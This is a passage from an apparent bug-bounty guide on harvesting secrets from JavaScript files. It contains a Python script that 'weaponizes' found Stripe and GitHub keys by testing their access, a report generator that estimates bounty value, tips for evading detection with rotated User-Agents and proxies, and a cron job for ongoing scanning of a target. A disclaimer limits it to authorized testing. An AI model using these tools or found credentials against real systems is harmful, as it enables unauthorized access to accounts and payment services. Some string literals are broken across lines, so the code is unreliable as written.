    category = secret_info['secret']['category'].lower()
    base_score = 0
    
    for key, score in base_scores.items():
        if key in category:
            base_score = score
            break
    
    # Adjust based on permissions
    if isinstance(permissions, dict) and 'error' not in permissions:
        accessible_services = len([p for p in permissions.values() if 'can' in p.lower() or 'user:' in p.lower() or 'account:' in p.lower()])
        base_score += accessible_services * 10
    
    return min(100, base_score)

# Load validated secrets
secrets_file = sys.argv[1] if len(sys.argv) > 1 else 'secrets/extracted_secrets_validated.json'

try:
    with open(secrets_file, 'r') as f:
        validated_secrets = json.load(f)
except FileNotFoundError:
    print("Validated secrets file not found")
    sys.exit(1)

# Weaponize valid secrets
weaponized_results = []

for secret_data in validated_secrets:
    if secret_data['is_valid']:
        secret_info = secret_data['secret']
        category = secret_info['category'].lower()
        match = secret_info['match']
        
        print(f"🔥 Weaponizing {category}: {match[:20]}...")
        
        permissions = {}
        
        if 'aws' in category:
            # For AWS, we need both access key and secret key
            # This is a simplified example
            permissions = {"note": "AWS weaponization requires secret key"}
        elif 'stripe' in category:
            permissions = weaponize_stripe_key(match)
        elif 'github' in category:
            permissions = weaponize_github_token(match)
        else:
            permissions = {"note": f"No weaponization method for {category}"}
        
        impact_score = calculate_impact_score(secret_data, permissions)
        
        weaponized_result = {
            'secret_info': secret_info,
            'permissions': permissions,
            'impact_score': impact_score,
            'weaponized_at': datetime.now().isoformat(),
            'risk_level': 'CRITICAL' if impact_score > 80 else 'HIGH' if impact_score > 60 else 'MEDIUM'
        }
        
        weaponized_results.append(weaponized_result)
        
        time.sleep(2)  # Rate limiting

# Save weaponization results
output_file = secrets_file.replace('.json', '_weaponized.json')
with open(output_file, 'w') as f:
    json.dump(weaponized_results, f, indent=2)

# Generate impact report
critical_count = len([r for r in weaponized_results if r['risk_level'] == 'CRITICAL'])
high_count = len([r for r in weaponized_results if r['risk_level'] == 'HIGH'])

print(f"
🎯 Weaponization completed:")
print(f"   CRITICAL risk: {critical_count}")
print(f"   HIGH risk: {high_count}")
print(f"   Total weaponized: {len(weaponized_results)}")

# Calculate potential bounty value
total_value = 0
for result in weaponized_results:
    if result['risk_level'] == 'CRITICAL':
        total_value += 5000
    elif result['risk_level'] == 'HIGH':
        total_value += 2000
    else:
        total_value += 500

print(f"💰 Estimated bounty value: ${total_value:,}")
EOF
```

### Comprehensive Impact Assessment

```bash
#!/bin/bash
# Comprehensive Impact Assessment
OUTPUT_DIR=$1

echo "📊 Generating comprehensive impact assessment..."

python3 << 'EOF'
import json
import os
import sys
from datetime import datetime
from pathlib import Path

def generate_impact_report(output_dir):
    """Generate comprehensive impact assessment report"""
    
    # Load all analysis results
    files_to_load = {
        'secrets': 'extracted_secrets.json',
        'validated': 'extracted_secrets_validated.json',
        'weaponized': 'extracted_secrets_validated_weaponized.json',
        'dependencies': 'dependency_analysis.json',
        'sourcemaps': 'sourcemap_analysis.json'
    }
    
    data = {}
    for key, filename in files_to_load.items():
        filepath = Path(output_dir) / filename
        if filepath.exists():
            try:
                with open(filepath, 'r') as f:
                    data[key] = json.load(f)
            except Exception as e:
                print(f"Error loading {filename}: {e}")
                data[key] = []
        else:
            data[key] = []
    
    # Generate comprehensive report
    report = {
        'assessment_date': datetime.now().isoformat(),
        'summary': {},
        'findings': {},
        'risk_assessment': {},
        'recommendations': [],
        'bounty_estimation': {}
    }
    
    # Summary statistics
    total_secrets = len(data.get('secrets', []))
    validated_secrets = len([s for s in data.get('validated', []) if s.get('is_valid')])
    critical_secrets = len([s for s in data.get('weaponized', []) if s.get('risk_level') == 'CRITICAL'])
    high_secrets = len([s for s in data.get('weaponized', []) if s.get('risk_level') == 'HIGH'])
    
    report['summary'] = {
        'total_secrets_found': total_secrets,
        'validated_secrets': validated_secrets,
        'critical_risk_secrets': critical_secrets,
        'high_risk_secrets': high_secrets,
        'vulnerable_dependencies': len(data.get('dependencies', [])),
        'sourcemap_secrets': sum(len(sm.get('secrets_found', [])) for sm in data.get('sourcemaps', []))
    }
    
    # Categorize findings
    secret_categories = {}
    for secret in data.get('secrets', []):
        category = secret.get('category', 'Unknown')
        if category not in secret_categories:
            secret_categories[category] = 0
        secret_categories[category] += 1
    
    report['findings'] = {
        'secret_categories': secret_categories,
        'high_confidence_secrets': [s for s in data.get('secrets', []) if s.get('confidence', 0) > 70],
        'api_endpoints': list(set([
            endpoint for dep in data.get('dependencies', [])
            for endpoint in dep.get('dependencies', {}).get('api_endpoints', [])
        ])),
        'vulnerable_libraries': list(set([
            lib for dep in data.get('dependencies', [])
            for lib in dep.get('dependencies', {}).get('vulnerable_libraries', [])
        ]))
    }
    
    # Risk assessment
    risk_score = 0
    risk_factors = []
    
    if critical_secrets > 0:
        risk_score += critical_secrets * 50
        risk_factors.append(f"{critical_secrets} critical secrets found")
    
    if high_secrets > 0:
        risk_score += high_secrets * 30
        risk_factors.append(f"{high_secrets} high-risk secrets found")
    
    if len(report['findings']['vulnerable_libraries']) > 0:
        risk_score += len(report['findings']['vulnerable_libraries']) * 10
        risk_factors.append(f"{len(report['findings']['vulnerable_libraries'])} vulnerable libraries")
    
    if len(report['findings']['api_endpoints']) > 10:
        risk_score += 20
        risk_factors.append(f"{len(report['findings']['api_endpoints'])} API endpoints exposed")
    
    report['risk_assessment'] = {
        'total_risk_score': min(risk_score, 1000),
        'risk_level': 'CRITICAL' if risk_score > 200 else 'HIGH' if risk_score > 100 else 'MEDIUM' if risk_score > 50 else 'LOW',
        'risk_factors': risk_factors
    }
    
    # Recommendations
    recommendations = [
        "Remove all hardcoded secrets from JavaScript files",
        "Implement proper secret management using environment variables",
        "Use build-time secret injection instead of runtime exposure",
        "Implement Content Security Policy (CSP) headers",
        "Regularly audit client-side code for sensitive data exposure"
    ]
    
    if report['findings']['vulnerable_libraries']:
        recommendations.append("Update all vulnerable JavaScript libraries to latest versions")
    
    if len(report['findings']['api_endpoints']) > 5:
        recommendations.append("Review and secure all exposed API endpoints")
    
    report['recommendations'] = recommendations
    
    # Bounty estimation
    bounty_value = 0
    if critical_secrets > 0:
        bounty_value += critical_secrets * 3000  # $3k per critical secret
    if high_secrets > 0:
        bounty_value += high_secrets * 1500     # $1.5k per high-risk secret
    if len(report['findings']['vulnerable_libraries']) > 0:
        bounty_value += len(report['findings']['vulnerable_libraries']) * 200  # $200 per vuln lib
    
    report['bounty_estimation'] = {
        'estimated_minimum': bounty_value,
        'estimated_maximum': bounty_value * 2,
        'factors': [
            f"Critical secrets: ${critical_secrets * 3000:,}",
            f"High-risk secrets: ${high_secrets * 1500:,}",
            f"Vulnerable libraries: ${len(report['findings']['vulnerable_libraries']) * 200:,}"
        ]
    }
    
    return report

# Generate report
output_dir = sys.argv[1] if len(sys.argv) > 1 else 'secrets'
report = generate_impact_report(output_dir)

# Save JSON report
with open(f"{output_dir}/impact_assessment.json", 'w') as f:
    json.dump(report, f, indent=2)

# Generate human-readable report
with open(f"{output_dir}/impact_report.txt", 'w') as f:
    f.write("🔍 JavaScript Secrets & API Keys - Impact Assessment Report
")
    f.write("=" * 70 + "

")
    f.write(f"Assessment Date: {report['assessment_date']}

")
    
    # Executive Summary
    f.write("📊 EXECUTIVE SUMMARY
")
    f.write("-" * 30 + "
")
    f.write(f"Total secrets discovered: {report['summary']['total_secrets_found']}
")
    f.write(f"Validated secrets: {report['summary']['validated_secrets']}
")
    f.write(f"Critical risk secrets: {report['summary']['critical_risk_secrets']}
")
    f.write(f"High risk secrets: {report['summary']['high_risk_secrets']}
")
    f.write(f"Vulnerable dependencies: {report['summary']['vulnerable_dependencies']}

")
    
    # Risk Assessment
    f.write("🚨 RISK ASSESSMENT
")
    f.write("-" * 30 + "
")
    f.write(f"Overall Risk Level: {report['risk_assessment']['risk_level']}
")
    f.write(f"Risk Score: {report['risk_assessment']['total_risk_score']}/1000

")
    f.write("Risk Factors:
")
    for factor in report['risk_assessment']['risk_factors']:
        f.write(f"  • {factor}
")
    f.write("
")
    
    # Key Findings
    f.write("🔍 KEY FINDINGS
")
    f.write("-" * 30 + "
")
    f.write("Secret Categories:
")
    for category, count in report['findings']['secret_categories'].items():
        f.write(f"  • {category}: {count}
")
    f.write(f"
API Endpoints Found: {len(report['findings']['api_endpoints'])}
")
    f.write(f"Vulnerable Libraries: {len(report['findings']['vulnerable_libraries'])}

")
    
    # Bounty Estimation
    f.write("💰 BOUNTY ESTIMATION
")
    f.write("-" * 30 + "
")
    f.write(f"Estimated Range: ${report['bounty_estimation']['estimated_minimum']:,} - ${report['bounty_estimation']['estimated_maximum']:,}

")
    f.write("Value Breakdown:
")
    for factor in report['bounty_estimation']['factors']:
        f.write(f"  • {factor}
")
    f.write("
")
    
    # Recommendations
    f.write("🛡️ RECOMMENDATIONS
")
    f.write("-" * 30 + "
")
    for i, rec in enumerate(report['recommendations'], 1):
        f.write(f"{i}. {rec}
")

print("✅ Impact assessment completed")
print(f"📊 Risk Level: {report['risk_assessment']['risk_level']}")
print(f"💰 Estimated Bounty: ${report['bounty_estimation']['estimated_minimum']:,} - ${report['bounty_estimation']['estimated_maximum']:,}")
EOF
```

---

## 💡 Elite Pro Tips

### Advanced Evasion & Stealth

```bash
# Use different User-Agents for requests
USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
)

# Rotate User-Agent for each request
UA=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
curl -H "User-Agent: $UA" "$JS_URL"

# Use proxy rotation
PROXIES=("proxy1:8080" "proxy2:8080" "proxy3:8080")
PROXY=${PROXIES[$RANDOM % ${#PROXIES[@]}]}
curl --proxy "$PROXY" "$JS_URL"

# Add random delays
sleep $((RANDOM % 10 + 5))  # Random delay 5-15 seconds
```

### Persistence & Monitoring

```bash
# Set up monitoring for new JS files
echo "📡 Setting up JS monitoring..."

# Create monitoring script
cat > js_monitor.sh << 'EOF'
#!/bin/bash
TARGET=$1
LAST_SCAN_FILE="last_js_scan.txt"

# Get current JS files
current_files=$(echo $TARGET | katana -js-crawl -silent | sort)

# Compare with last scan
if [ -f "$LAST_SCAN_FILE" ]; then
    new_files=$(comm -13 "$LAST_SCAN_FILE" <(echo "$current_files"))
    if [ ! -z "$new_files" ]; then
        echo "🆕 New JS files detected:"
        echo "$new_files"
        # Process new files
        echo "$new_files" | while read js_url; do
            ./analyze_single_js.sh "$js_url"
        done
    fi
fi

# Update last scan
echo "$current_files" > "$LAST_SCAN_FILE"
EOF

chmod +x js_monitor.sh

# Schedule monitoring (add to crontab)
echo "0 */6 * * * /path/to/js_monitor.sh target.com" | crontab -
```

---

## 🎯 Bounty Maximization Strategy

1. **Focus on high-value secrets**: AWS keys, Stripe keys, database URLs = $3000+
2. **Chain with other vulnerabilities**: JS secrets + SSRF = Higher payout
3. **Document thoroughly**: Show impact, provide PoC, demonstrate access
4. **Test responsibly**: Don't abuse found credentials, just prove access
5. **Report quickly**: First to report gets the bounty

---

## 🚨 Legal Disclaimer

This guide is for authorized penetration testing and bug bounty programs only. Always ensure you have proper authorization before testing any systems. Unauthorized access to computer systems is illegal.

---

**Elite Hacker Tip**: JavaScript source maps are goldmines! They often contain original source code with even more secrets than minified versions. Always check for .map files! 🔥
